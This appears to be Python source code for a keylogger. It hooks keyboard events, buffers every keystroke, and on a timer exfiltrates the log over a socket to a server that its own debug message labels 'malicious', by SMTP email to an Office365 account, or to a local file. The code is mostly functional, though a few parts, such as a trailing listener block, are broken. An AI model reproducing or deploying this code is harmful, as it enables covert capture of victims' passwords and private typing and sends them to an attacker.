import sys
import socket
import keyboard
import smtplib  # SMTP protocol
from datetime import datetime
from threading import Timer
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

REPORT_TIME = 60 # Time in seconds
EMAIL_ADDRESS = "email@provider.com"
EMAIL_PASSWORD = "pass"

# Socket
host = socket.gethostname()
port = 1337
s = socket.socket()
s.connect((host,port))

# Change to True to see debug messages
verbose=False

# Storage of keylogs variable
log = ""

# Keylogger init
class Keylogger():
    try: 
        def __init__(self, interval, report_type="email"):
            self.interval = interval
            self.report_type = report_type
            self.log = log
            self.start_dt = datetime.now()
            self.end_dt = datetime.now()

        # Keyboard event handling (when a key is released)
        def callback(self, event):
            key = event.name
            if len(key) > 1:
                if key == "space":
                    key = " "
                elif key == "enter":
                    key = "[ENTER]\n"
                elif key == "decimal":
                    key = "."
                else:
                    # replace spaces with underscores
                    key = key.replace(" ", "_")
                    key = f"[{key.upper()}]"
            self.log += key

        # Updates the name of the file depending on the time
        def update_filename(self):
            start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
            end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
            self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

        # Creates a file, and stores the value of 'self.log' variable inside
        def report_to_file(self):
            ### path = ".logs\"
            with open(f".\logs\{self.filename}.txt", "w") as f:
                print(self.log, file=f)
            
            if verbose:    
                print(f"[+] Saved {self.filename}.txt")

        # Talks with python socket server and sends logs to the server
        def report_to_server(self):
            if verbose:
                print(f"[+] Sent logs to malicious server")

            # TO-DO: IF not writing for 2 seconds (more or less) send logs, instead of using intervals 

            s.sendall((self.log).encode('utf-8'))

        # --- Email implementation stuff --- 

        # MIMEMultipart constructor (HTML version and text version)
        def prepare_mail(self, message):
            msg = MIMEMultipart("alternative")

            msg["From"] = EMAIL_ADDRESS
            msg["To"] = EMAIL_ADDRESS
            msg["Subject"] = "Keylogger logs"

            html = f"<p>{message}</p>"
            text_part = MIMEText(message, "plain")
            html_part = MIMEText(html, "html")
            msg.attach(text_part)
            msg.attach(html_part)

            return msg.as_string()

        # Manages a connection to an SMTP server as TLS mode
        def sendmail(self, email, password, message):
            server = smtplib.SMTP(host="smtp.office365.com", port=587)
            server.starttls()
            server.login(email, password)
            server.sendmail(email, email, self.prepare_mail(message))
            server.quit()

            if verbose:
              print(f"{datetime.now()} - Sent an email to {email} containing:  {message}")

        # --- End Email implementation stuff --- 

        # Function called every self.interval 
        # Sends keylogs and resets self.log variable
        def report(self):
            if self.log:
                self.end_dt = datetime.now()
                self.update_filename()
                if self.report_type == "email":
                    self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
                elif self.report_type == "file":
                    self.report_to_file()
                elif self.report_type == "server":
                    self.report_to_server()
                if verbose:
                    print(f"[{self.filename}] - {self.log}")
                self.start_dt = datetime.now()
            self.log = ""
            timer = Timer(interval=self.interval, function=self.report)
            # set the thread as daemon (dies when main thread die)
            timer.daemon = True
            timer.start()

        # Start time, keylogs, report
        def start(self):
            self.start_dt = datetime.now()
            keyboard.on_release(callback=self.callback)
            self.report()

            if verbose:
                print(f"{datetime.now()} - Started keylogger")

            keyboard.wait()

    except KeyboardInterrupt:
        print("\nExiting program.")
        sys.exit()

    except socket.error:
        print("Couldn't connect to server.")
        sys.exit()

# Main function, change report type
if __name__ == "__main__":
    keylogger = Keylogger(interval=5, report_type="server")
    # keylogger = Keylogger(interval=REPORT_TIME, report_type="email")
    # keylogger = Keylogger(interval=REPORT_TIME, report_type="file")
    keylogger.start()

# Socket listener
with keyboard(__name__=__name__) as listener :
    listener.join() 